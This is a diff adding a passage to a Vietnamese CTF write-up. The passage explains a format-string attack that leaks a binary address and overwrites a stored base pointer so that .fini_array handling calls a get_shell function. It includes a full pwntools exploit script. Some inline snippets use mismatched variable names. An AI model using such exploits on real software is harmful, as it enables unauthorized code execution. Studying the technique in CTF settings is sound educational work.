@@ -556,3 +556,157 @@ Nhưng ta vẫn còn cách khác để gọi `get_shell` là qua `.fini_array`.
 - Nằm gần các biến môi trường.
 
 - Chứa địa chỉ binary base.
+
+Trước tiên hãy xem ta có thể khai thác được gì trong Stack.
+
+![Alt text](image/fs39.png)
+
+Trong Stack hiện tại leak được 1 địa chỉ binary.
+
+![Alt text](image/fs39.png)
+
+Leak luôn địa chỉ `rw-` chứa binary base để tí nữa ghi đè lên.
+
+	p.sendlineafter(b'something: ',b'%15$p%38$p')
+	p.recvuntil(b'said: ')
+	array=p.recvline()[:-1].split(b'0x')
+	
+	exe_leak=int(array[1],16)             		//Leak binary
+	base_contain=int(array[2],16)				//Leak con trỏ đang trỏ đến binary base
+	exe.address=exe_leak-exe.sym['_start']
+	log.info('exe.address: '+hex(exe.address))
+	log.info('base_ptr: '+hex(base_pointer))
+	p.sendlineafter('>',b'n')
+
+Vì `.fini_array` này là 1 mảng chứa tập hợp các con trỏ hàm nên không thể trực tiếp ghi đè địa chỉ `get_shell` lên.
+Đầu tiên cần đưa địa `get_shell` vào một phân vùng `rw-`.
+	
+	rw_section=exe.address+0x4048
+	print(hex(rw_section))
+	get_shell=exe.sym['get_shell']
+	data={										//dictionary chứa < padding : địa chỉ nạp vào >
+	    (get_shell>>0)&0xffff :rw_section,
+	    (get_shell>>16)&0xffff:rw_section+2,
+	    (get_shell>>32)&0xffff:rw_section+4,
+	}
+	order=sorted(data)							//Sắp xếp nạp vào padding nhỏ -> lớn	
+	
+	payload=f'%{order[0]}c%13$hn'.encode()
+	payload+=f'%{order[1]-order[0]}c%14$hn'.encode()
+	payload+=f'%{order[2]-order[1]}c%15$hn'.encode()
+	payload=payload.ljust(64-24,b'A')
+	payload+=flat(
+	    data[order[0]],
+	    data[order[1]],
+	    data[order[2]],
+	)
+	p.sendlineafter(b'something: ',payload)
+	p.sendlineafter(b'>',b'n')
+
+Giờ quay lại xem offset từ base address đến `.fini_array`.
+
+![Alt text](image/fs40.png)
+![Alt text](image/fs41.png)
+
+Khi kết thúc chương trình thì base address sẽ cộng thêm cho `0x3d90` để đến mảng chứa con trỏ hàm dọn dẹp.
+
+Vậy ta có thể suy luận:
+
+![Alt text](image/fs41.png)
+
+Bây giờ thì nhập địa chỉ cuối cùng tính từ công thức trên ghi đè vào địa hỉ chứa base address kia.
+
+	fake_base=exe.address+0x4048-0x3d90        //công thức để chuyển hướng địa chỉ
+	data2={
+	    (fake_base>>0)&0xffff :base_content,
+	    (fake_base>>16)&0xffff:base_content+2,
+	    (fake_base>>32)&0xffff:base_content+4,
+	}
+	order=sorted(data2)
+	payload=f'%{order[0]}c%13$hn'.encode()
+	payload+=f'%{order[1]-order[0]}c%14$hn'.encode()
+	payload+=f'%{order[2]-order[1]}c%15$hn'.encode()
+	payload=payload.ljust(64-24,b'A')
+	payload+=flat(
+	    data2[order[0]],
+	    data2[order[1]],
+	    data2[order[2]],
+	)
+	
+	p.sendlineafter(b'something: ',payload)
+	p.sendlineafter(b'>',b'y')
+
+![Alt text](image/fs41.png)
+
+Một khi chương trình cộng thêm `0x3d90` để đến `.fini_array`, luồng thực thi sẽ lập tức chuyển đến `get_shell`.
+
+## Script Python
+
+	######################
+	###LEAK_EXE_ADDRESS###
+	######################
+	p.sendlineafter(b'something: ',b'%15$p%38$p')
+	p.recvuntil(b'said: ')
+	array=p.recvline()[:-1].split(b'0x')
+	print(array)
+	
+	exe_leak=int(array[1],16)
+	base_contain=int(array[2],16)
+	exe.address=exe_leak-exe.sym['_start']
+	log.info('exe.address: '+hex(exe.address))
+	log.info('base_ptr: '+hex(base_contain))
+	p.sendlineafter('>',b'n')
+	
+	#######################
+	###PREPARE_PAYLOAD#####
+	#######################
+	rw_section=exe.address+0x4048
+	print(hex(rw_section))
+	get_shell=exe.sym['get_shell']
+	data={
+	    (get_shell>>0)&0xffff :rw_section,
+	    (get_shell>>16)&0xffff:rw_section+2,
+	    (get_shell>>32)&0xffff:rw_section+4,
+	}
+	order=sorted(data)
+	
+	payload=f'%{order[0]}c%13$hn'.encode()
+	payload+=f'%{order[1]-order[0]}c%14$hn'.encode()
+	payload+=f'%{order[2]-order[1]}c%15$hn'.encode()
+	payload=payload.ljust(64-24,b'A')
+	payload+=flat(
+	    data[order[0]],
+	    data[order[1]],
+	    data[order[2]],
+	)
+	p.sendlineafter(b'something: ',payload)
+	p.sendlineafter(b'>',b'n')
+	
+	#########################
+	####SEND_FAKE_BASE#######
+	#########################
+	
+	fake_base=exe.address+0x4048-0x3d90
+	data2={
+	    (fake_base>>0)&0xffff :base_contain,
+	    (fake_base>>16)&0xffff:base_contain+2,
+	    (fake_base>>32)&0xffff:base_contain+4,
+	}
+	order=sorted(data2)
+	payload=f'%{order[0]}c%13$hn'.encode()
+	payload+=f'%{order[1]-order[0]}c%14$hn'.encode()
+	payload+=f'%{order[2]-order[1]}c%15$hn'.encode()
+	payload=payload.ljust(64-24,b'A')
+	payload+=flat(
+	    data2[order[0]],
+	    data2[order[1]],
+	    data2[order[2]],
+	)
+	
+	p.sendlineafter(b'something: ',payload)
+	p.sendlineafter(b'>',b'y')
+	
+	log.info('fake_base: '+hex(fake_base))
+	
+	p.interactive()
+
